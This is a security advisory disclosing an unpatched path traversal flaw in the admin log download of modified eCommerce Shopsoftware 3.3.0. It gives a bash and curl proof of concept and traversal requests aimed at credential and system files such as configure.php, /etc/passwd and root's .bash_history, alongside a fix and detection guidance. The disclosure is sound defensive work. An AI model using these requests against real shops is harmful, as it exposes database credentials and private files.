# Security Advisory: Path Traversal in admin/logs.php — Arbitrary File Download

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.9 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`
> **CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 is affected by a path traversal vulnerability in `admin/logs.php`. The `download` action constructs a file path by directly concatenating the log directory constant with an unsanitized `GET file` parameter. An authenticated admin can read any file accessible to the web server process by traversing directories with `../` sequences, bypassing the intended log directory restriction.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/logs.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

`admin/logs.php` serves log file downloads to administrators. The `GET file` parameter is appended to `DIR_FS_LOG` without any path traversal mitigation (no `strpos(..)` check, no `realpath()` confinement, no `basename()` strip). Unlike `backup.php`, the logs endpoint does not enforce an extension filter, making any file readable by the web process accessible — including PHP source files, configuration files with credentials, and system files.

**Root cause:**

```php
// admin/logs.php:21–25 (approximate)
case 'download':
    $file = DIR_FS_LOG . $_GET['file'];   // ← $_GET['file'] not sanitized
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
```

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** Target file must exist and be readable by `www-data`; no extension restriction

---

## 4. Impact

- **Confidentiality:** High — any file readable by the web process can be exfiltrated (PHP source, config files with DB credentials, `/etc/passwd`, private keys if world-readable)
- **Integrity:** None
- **Availability:** None

The absence of an extension filter (unlike backup.php) makes this vulnerability more impactful — PHP source files and configuration files containing database credentials can be read directly.

---

## 5. Classification

### CVSS

- **Score:** 4.9
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | None |
| Availability (A) | None |

### CWE

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory

### CAPEC

- CAPEC-139: Relative Path Traversal

---

## 6. Exploitation Scenario

1. Attacker with admin access identifies the logs download endpoint.
2. Attacker crafts `?action=download&file=../../../../../../tmp/rs-log-traversal-test.log`.
3. PHP resolves the path outside the log directory.
4. The file is served as a download.
5. Attacker can target configuration files (`../../includes/configure.php` for database credentials), PHP source files, or any OS file readable by the web server.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/logs.php (lines 21–25)
Parameter(s): file (GET), action=download (GET)
Method: GET · Authentication: Admin required
```

### Example Request

```http
GET /admin/logs.php?action=download&file=../../../../../../tmp/rs-log-traversal-test.log HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
```

### Observed Response

```text
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="rs-log-traversal-test.log"

REDSCAN_LOG_TRAVERSAL_CONFIRMED
```

### Result

Confirmed in authorized Docker lab. File `/tmp/rs-log-traversal-test.log` downloaded via traversal. No extension restriction: any readable file can be targeted.

**Evidence:** HTTP 200 with `REDSCAN_LOG_TRAVERSAL_CONFIRMED` as file content.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V07 PoC — Path Traversal in logs.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Place test file outside webroot
docker exec modifiedshop_web bash -c \
  "echo 'REDSCAN_LOG_TRAVERSAL_CONFIRMED' > /tmp/rs-log-traversal-test.log"

# Step 2: Download via traversal
curl -v -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/logs.php?action=download&file=../../../../../../tmp/rs-log-traversal-test.log"

# Real attack targets (no extension restriction):
# file=../../includes/configure.php          → DB credentials in plaintext
# file=../../../../../../etc/passwd          → user enumeration
# file=../../../../../../root/.bash_history  → command history
```

### Expected Result

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="rs-log-traversal-test.log"

REDSCAN_LOG_TRAVERSAL_CONFIRMED
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove any data.
- Does not create persistence or backdoors.
- Does not contain real credentials.

---

## 9. Reproduction Steps

1. Deploy authorized instance. Place a test file at `/tmp/test.log`.
2. Log in as admin.
3. Send: `GET /admin/logs.php?action=download&file=../../../../../../tmp/test.log`
4. Confirm the file is returned as a download.
5. Repeat with `file=../../includes/configure.php` to confirm PHP source retrieval.

---

## 10. Mitigation

- Use `basename($_GET['file'])` to strip directory components, allowing only plain filenames.
- Apply `realpath()` and verify the resolved path starts with `DIR_FS_LOG`.
- Add explicit `strpos(.., '..')` check as minimum fix.
- Restrict log file downloads to a specific extension whitelist if feasible.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// Minimal fix:
case 'download':
    $filename = basename($_GET['file']);   // strips all directory components
    $file = DIR_FS_LOG . $filename;
    // Or more robust:
    $file = realpath(DIR_FS_LOG . $_GET['file']);
    if ($file === false || strpos($file, realpath(DIR_FS_LOG)) !== 0) {
        xtc_redirect(...);
        break;
    }
```

---

## 12. Detection and Indicators

- GET to `/admin/logs.php?action=download` with `..` in `file` parameter.
- Downloads of non-log file types (`.php`, `.ini`, `.conf`).

### Example Log Search

```text
grep "logs.php.*download" access.log | grep "\.\."
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- CAPEC-139: https://capec.mitre.org/data/definitions/139.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
